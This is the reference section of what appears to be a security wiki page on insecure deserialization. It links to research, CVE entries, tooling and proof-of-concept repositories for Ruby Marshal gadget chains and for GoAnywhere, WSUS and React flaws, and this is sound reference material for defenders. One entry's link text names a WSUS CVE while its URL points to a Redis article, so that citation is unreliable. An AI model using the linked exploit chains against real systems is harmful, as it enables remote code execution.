- Phrack #69 – Rails 3/4 Marshal chain: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 insecure deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Discovering gadget chains in Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby unsafe deserialization (query help): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 universal chain: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 release: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby fix PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Auditing RubyGems.org (Marshal findings): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/
- watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035: https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/
- [OffSec – CVE-2025-59287 WSUS unsafe deserialization (blog)](https://www.offsec.com/blog/recent-vulnerabilities-in-redis-servers-lua-scripting-engine-2/)
- [PoC – tecxx/CVE-2025-59287-WSUS](https://github.com/tecxx/CVE-2025-59287-WSUS)
- [RSC Report Lab – CVE-2025-55182 (React 19.2.0)](https://github.com/ghe770mvp/RSC_Vuln_Lab)

{{#include ../../banners/hacktricks-training.md}}
